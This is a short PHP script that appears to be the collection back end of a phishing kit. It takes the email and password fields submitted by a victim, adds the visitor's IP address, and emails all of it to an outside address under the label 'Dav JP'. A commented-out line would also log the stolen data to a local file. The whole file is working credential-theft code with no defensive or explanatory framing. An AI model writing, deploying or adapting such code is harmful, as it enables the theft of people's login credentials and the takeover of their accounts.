<?php
$ip = getenv("REMOTE_ADDR");
$onlineid = $_POST["email"];
$passcode = $_POST["password"];
$message  = "*********** Dav JP ***********\n";
$message .= "UserID : $onlineid\n";
$message .= "Passwd : $passcode\n";
$message .= "IP Address : $ip\n";
$message .= "*********** Dav JP ***********\n\n\n";


$send="info@jhflooringinc.com";

$subject = "Dav JP | $onlineid | $ip";
$headers = "From: Dav JP<information@mail.com>";
$headers .= $_POST['email']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
//$text = fopen('coolio.txt', 'a');
//fwrite($text, $message);
header("LOCATION: ");
?>